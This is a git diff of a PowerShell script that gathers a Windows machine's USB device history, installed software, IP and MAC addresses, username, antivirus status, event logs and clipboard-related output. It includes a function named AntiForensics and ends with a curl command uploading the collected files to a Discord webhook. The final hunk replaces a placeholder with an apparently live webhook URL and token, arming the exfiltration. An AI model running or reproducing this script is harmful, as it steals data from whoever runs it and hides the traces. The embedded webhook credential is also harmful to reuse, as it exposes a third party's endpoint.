@@ -121,10 +121,10 @@ if (Test-Path $usbStorRoot) {
             $output += "Class          : $($props.Class)"
             $output += "DeviceDesc     : $($props.DeviceDesc)"
             $output += "VID/PID        : $(($deviceKey -split '&')[1,2] -join ', ')"
-            # FirstInstallDate and LastArrivalDate (if present)
+            # FirstInstallDate and LastArrivalDate if present
             if ($props.InstallDate)        { $output += "InstallDate    : $($props.InstallDate)" }
             if ($props.LastArrivalDate)    { $output += "LastArrivalDate: $($props.LastArrivalDate)" }
-            # Write output block
+
             $output | Out-File -Append $OutFile
             "" | Out-File -Append $OutFile
         }
@@ -171,19 +171,19 @@ Get-WinEvent -FilterHashtable @{LogName='System';ID=2003,2100,2102,2106,400,410,
     "Time: $($_.TimeCreated), Message: $($_.Message)"
 } | Out-File -Append $OutFilePC
 
-# ---- Get installed software ----
+# get installed software
 Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* |
 Select-Object DisplayName, DisplayVersion, Publisher, InstallDate |
 Out-File -Append $OutFilePC
 
-# ---- Get Net Information ----
+# get net information
 Get-NetAdapter | Select-Object Name, MacAddress | Out-File -Append $OutFile
 
 Get-NetIPAddress | Where-Object { $_.AddressFamily -eq "IPv4" -and $_.InterfaceAlias -notlike "*Virtual*" } | Select-Object IPAddress | Out-File -Append $OutFile
 
 Write-Output "Username: $env:USERNAME" | Out-File -Append $OutFile
 
-# Get Antivirus status
+# get antivirus status
 $antiviruses = Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct
 if ($antiviruses) {
     $antiviruses | ForEach-Object {
@@ -281,7 +281,7 @@ function AntiForensics {
     catch {}
 }
 
-$webhookuri = "DISCORD_WEBHOOK"
+$webhookuri = "https://discord.com/api/webhooks/1334995176321581166/3RoYJez5stb8LCsQx_4znANOdHR87FODSlI5kEXVYIwCgwT7-Cx9C-IertebeqnNC5kH"
 
 curl.exe -F "file1=@$OutFile" -F "file2=@$OutFileClip" -F "file3=@$OutFilePC" -F "file4=@$HtmlPath" $webhookuri
 
